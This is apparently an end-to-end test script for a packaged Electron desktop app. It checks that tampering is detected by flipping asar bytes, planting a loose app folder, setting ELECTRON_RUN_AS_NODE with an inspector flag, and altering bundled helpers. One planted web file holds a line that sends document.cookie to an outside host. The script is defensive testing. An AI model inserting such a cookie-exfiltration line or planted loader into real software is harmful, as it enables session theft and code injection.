import { spawn, spawnSync } from "node:child_process";
import { cpSync, existsSync, mkdirSync, readFileSync, rmSync, writeFileSync, copyFileSync, openSync, readSync, writeSync, closeSync, statSync } from "node:fs";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { packageApp } from "../../apps/desktop/scripts/package.mjs";

const repo = resolve(dirname(fileURLToPath(import.meta.url)), "../..");
const work = join(repo, "target/packaged-test");
rmSync(work, { recursive: true, force: true });
mkdirSync(work, { recursive: true });
// Tampered apps crash on purpose; macOS would show 'quit unexpectedly' for each. Hide those dialogs for the run only.
const crashKey = "com.apple.CrashReporter";
const before = spawnSync("defaults", ["read", crashKey, "DialogType"], { encoding: "utf8" });
const hadValue = before.status === 0;
spawnSync("defaults", ["write", crashKey, "DialogType", "none"]);
const restoreCrashDialogs = () => (hadValue ? spawnSync("defaults", ["write", crashKey, "DialogType", before.stdout.trim()]) : spawnSync("defaults", ["delete", crashKey, "DialogType"]));
process.on("exit", restoreCrashDialogs);
const results = [];
const check = (n, ok, d = "") => (results.push(ok), console.log(`${ok ? "PASS" : "FAIL"}  ${n}${d ? "  " + d : ""}`));

const enclaveHelper = join(repo, "target/debug/kaku-enclave");
// the text recognition helper is bundled and the calendar reader is not, so both a changed helper and an unrecorded one can be tried
const ocrHelper = join(repo, "target/debug/kaku-ocr");
if (!existsSync(ocrHelper)) spawnSync("sh", [join(repo, "helpers/ocr/build.sh"), ocrHelper], { stdio: "ignore" });
const pkg = await packageApp(join(work, "pkg"), { cookieEncryption: false, kaku: join(repo, "target/debug/kaku"), web: join(repo, "apps/web/dist"), enclave: existsSync(enclaveHelper) ? enclaveHelper : null , ocr: ocrHelper });
check("the app is packaged as one asar with its integrity hash in Info.plist, and the load-only-from-asar and integrity fuses on", pkg.fuses["1"] === 48 && pkg.fuses["4"] === 49 && pkg.fuses["5"] === 49 && pkg.fuses["0"] === 48 && pkg.fuses["2"] === 48 && pkg.fuses["3"] === 48, JSON.stringify(pkg.fuses));

// `bundled` starts the app the way an installed copy starts: no KAKU_BIN and no --ui-dir, so it runs what it carries.
async function launch(label, extraEnv = {}, { bundled = false } = {}) {
  const data = join(work, `data-${label}`);
  rmSync(data, { recursive: true, force: true });
  mkdirSync(join(work, `root-${label}`), { recursive: true });
  mkdirSync(data, { recursive: true });
  const env = { ...process.env, KAKU_BIN: join(repo, "target/debug/kaku"), KAKUREGA_DATA_DIR: data, KAKU_ARGS: `--root ${join(work, `root-${label}`)} --scripted ${join(repo, "tests/e2e/script.json")}${bundled ? "" : ` --ui-dir ${join(repo, "apps/web/dist")}`}`, ...extraEnv };
  if (bundled) delete env.KAKU_BIN;
  const p = spawn(pkg.bin, [], { stdio: ["ignore", "ignore", "pipe"], env });
  let stderr = "";
  p.stderr.on("data", (d) => (stderr += d));
  let exited = null;
  p.on("exit", (c, sig) => (exited = c ?? sig ?? "exited"));
  let served = false;
  for (let i = 0; i < 40 && !served && exited === null && !stderr.includes("kakurega: not started"); i++) {
    await new Promise((r) => setTimeout(r, 500));
    if (existsSync(join(data, "admin.json"))) {
      try { const a = JSON.parse(readFileSync(join(data, "admin.json"), "utf8")); const r = await fetch(`http://127.0.0.1:${a.port}/`); served = r.status === 403 && (await r.text()).includes("SHELL_ONLY"); } catch {}
    }
  }
  const stillRunning = exited === null;
  const psOut = spawnSync("ps", ["-axo", "command"], { encoding: "utf8" }).stdout;
  const companionLine = psOut.split("\n").find((l) => l.includes(`serve --data-dir ${data}`)) ?? "";
  p.kill("SIGKILL");
  spawnSync("pkill", ["-f", `kaku serve --data-dir ${data}`]);
  await new Promise((r) => setTimeout(r, 300));
  return { served, exited, stillRunning, data, companionLine, stderr };
}

// The first launches of a bundle signed ad hoc sometimes never finish starting; a launch that is expected to work and hangs is made again
// (a tampered bundle is expected to refuse to run, so those launches are never repeated).
async function launchGood(label, extraEnv = {}, opts = {}) {
  let r;
  for (let attempt = 0; attempt < 6; attempt++) {
    r = await launch(label, extraEnv, opts);
    if (r.served || !r.stillRunning) break;
  }
  return r;
}

// A launch that must be refused by the shell's own check has to say so; a launch that merely hung is made again instead of being
// counted as a refusal.
async function launchRefused(label) {
  let r;
  for (let attempt = 0; attempt < 6; attempt++) {
    r = await launch(label, {}, { bundled: true });
    if (r.served || r.stderr.includes("kakurega: not started")) break;
  }
  return r;
}

const clean = await launchGood("clean");
check("the packaged app starts from its asar and its companion serves the workspace", clean.served);
check("the packaged app starts its companion with approvals closed to anything but an enrolled key", clean.companionLine.includes("--require-approver"), clean.companionLine);

const asarPath = pkg.asarPath;
const backup = join(work, "app.asar.orig");
copyFileSync(asarPath, backup);
const flip = (offset) => {
  const fd = openSync(asarPath, "r+");
  const b = Buffer.alloc(1);
  readSync(fd, b, 0, 1, offset);
  b[0] ^= 0xff;
  writeSync(fd, b, 0, 1, offset);
  closeSync(fd);
};
flip(20);
const headerTampered = await launch("header");
check("an asar whose header was changed does not start", !headerTampered.served && headerTampered.exited !== null, `exit=${headerTampered.exited}`);
copyFileSync(backup, asarPath);
flip(statSync(asarPath).size - 40);
const bodyTampered = await launch("body");
check("an asar whose file contents were changed does not run the changed code", !bodyTampered.served, `exit=${bodyTampered.exited} served=${bodyTampered.served}`);
copyFileSync(backup, asarPath);

const marker = join(work, "evil-ran");
const loose = join(pkg.app, "Contents/Resources/app");
mkdirSync(loose, { recursive: true });
writeFileSync(join(loose, "package.json"), JSON.stringify({ name: "evil", main: "main.js" }));
writeFileSync(join(loose, "main.js"), `require('node:fs').writeFileSync(${JSON.stringify(marker)}, 'ran'); require('electron').app.quit();`);
const withLoose = await launchGood("loose");
check("a loose app folder planted beside the asar is ignored and never runs", !existsSync(marker) && withLoose.served, `marker=${existsSync(marker)} served=${withLoose.served}`);
rmSync(loose, { recursive: true, force: true });

const nodeEnv = await launchGood("nodeenv", { ELECTRON_RUN_AS_NODE: "1", NODE_OPTIONS: "--inspect=9238" });
check("with ELECTRON_RUN_AS_NODE and NODE_OPTIONS set the packaged binary still starts as the app, not as Node", nodeEnv.served);

const restored = await launchGood("restored");
check("after restoring the original asar the app starts again (the failures above were caused by the tampering)", restored.served);
// the parts outside the asar: the app runs what it carries, and only if each part is the one it was built with
check("the bundle records the SHA-256 of its kaku and its web interface inside the asar", /^[0-9a-f]{64}$/.test(pkg.manifest.kaku) && /^[0-9a-f]{64}$/.test(pkg.manifest.web) && existsSync(pkg.parts.kaku) && existsSync(join(pkg.parts.web, "index.html")), JSON.stringify(Object.keys(pkg.manifest)));
const own = await launchGood("bundled", {}, { bundled: true });
check("with no KAKU_BIN the packaged app starts the kaku it carries and serves the web interface it carries", own.served && own.companionLine.startsWith(pkg.parts.kaku + " serve") && own.companionLine.includes(`--ui-dir ${pkg.parts.web}`), own.companionLine.slice(0, 160));
const kakuBackup = join(work, "kaku.orig");
copyFileSync(pkg.parts.kaku, kakuBackup);
writeFileSync(pkg.parts.kaku, readFileSync(kakuBackup).subarray(0, statSync(kakuBackup).size - 1));
const changedKaku = await launchRefused("changed-kaku");
check("hostile: a bundled kaku that was changed is never started, and the app says which part changed", !changedKaku.served && changedKaku.stderr.includes("kaku does not match bundle.json") && changedKaku.companionLine === "" && !existsSync(join(changedKaku.data, "admin.json")), changedKaku.stderr.trim().split("\n")[0]);
copyFileSync(kakuBackup, pkg.parts.kaku);
const planted = join(pkg.parts.web, "planted.js");
writeFileSync(planted, "fetch('https://example.com/?' + document.cookie)");
const changedWeb = await launchRefused("changed-web");
check("hostile: a file added to the bundled web interface stops the app before the companion starts", !changedWeb.served && changedWeb.stderr.includes("web does not match bundle.json") && changedWeb.companionLine === "", changedWeb.stderr.trim().split("\n")[0]);
rmSync(planted);
check("kaku's text recognition helper sits beside it, recorded in the bundle", /^[0-9a-f]{64}$/.test(pkg.manifest.ocr ?? "") && existsSync(pkg.parts.ocr) && pkg.manifest.calendar === undefined, JSON.stringify(Object.keys(pkg.manifest)));
const ocrBackup = join(work, "ocr.orig");
copyFileSync(pkg.parts.ocr, ocrBackup);
writeFileSync(pkg.parts.ocr, readFileSync(ocrBackup).subarray(0, statSync(ocrBackup).size - 1));
const changedOcr = await launchRefused("changed-ocr");
check("hostile: a changed helper beside kaku stops the app before kaku starts", !changedOcr.served && changedOcr.stderr.includes("ocr does not match bundle.json") && changedOcr.companionLine === "", changedOcr.stderr.trim().split("\n")[0]);
copyFileSync(ocrBackup, pkg.parts.ocr);
writeFileSync(pkg.parts.calendar, "#!/bin/sh\necho planted\n");
const plantedHelper = await launchRefused("planted-helper");
check("hostile: a helper packaging never recorded, planted beside kaku, stops the app before kaku starts", !plantedHelper.served && plantedHelper.stderr.includes("calendar does not match bundle.json") && plantedHelper.companionLine === "", plantedHelper.stderr.trim().split("\n")[0]);
rmSync(pkg.parts.calendar);
const devOverride = await launchGood("override");
check("KAKU_BIN still points the packaged app at another kaku (for development)", devOverride.served && devOverride.companionLine.startsWith(join(repo, "target/debug/kaku") + " serve"), devOverride.companionLine.slice(0, 120));
const restored2 = await launchGood("restored-parts", {}, { bundled: true });
check("with its parts restored the app starts from its own kaku again", restored2.served);
const bad = results.filter((r) => !r).length;
console.log(bad === 0 ? `\nall ${results.length} packaged-app checks passed` : `\n${bad} FAILED`);
process.exit(bad ? 1 : 0);
